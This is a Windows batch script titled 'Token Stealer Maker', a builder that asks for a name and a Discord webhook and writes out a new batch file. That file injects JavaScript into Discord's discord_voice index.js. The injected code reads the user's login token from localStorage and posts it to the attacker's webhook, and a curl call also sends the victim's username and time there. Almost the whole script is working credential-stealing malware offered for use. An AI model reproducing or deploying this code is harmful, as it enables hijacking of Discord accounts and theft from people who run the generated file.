: : Warning! If you don't know what you are doing, please leave now. Touching anything here may result the file to not run properly!

@echo off
title Token Stealer Maker
goto setup

:menu
echo                    ________________________Token Stealer Maker_____________________________
echo                        * Make discord token stealers with 2 steps!
echo                        * Version 1.0.2          
echo                        * Made by 6DARIO9!
echo                    _________________________________________________________________________
echo.
echo.
echo.
set /p name=What is the name of the stealer? :
set /p webhook=What is the webhook? : 
goto TSM




: : ---------------------------------------------------------------------------
: :                             [-] ADDONS [-]

:setup
@echo off
title Token Stealer Maker
color FD
goto menu


:TSM
echo @echo off >> %name%.bat
echo title %name% >> %name%.bat
echo if exist "%appdata%\logs.txt" ( >> %name%.bat
echo GOTO send >> %name%.bat 
echo ) else ( >> %name%.bat
echo echo Error! >> %name%.bat
echo ) >> %name%.bat
echo :send >>%name%.bat
echo set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >> %name%.bat
echo echo. >> %name%.bat
echo echo %str% >> "%appdata%\Discord\0.0.305\modules\discord_voice\index.js" >> %name%.bat
echo curl -X POST -H "Content-type: application/json" --data "{\"content\": \"USERNAME: %USERNAME%\nTIME: %TIME%\n\"}" %webhook% >> %name%.bat
echo echo. >> %name%.bat
echo pause>nul >> %name%.bat





: : ---------------------------------------------------------------------------

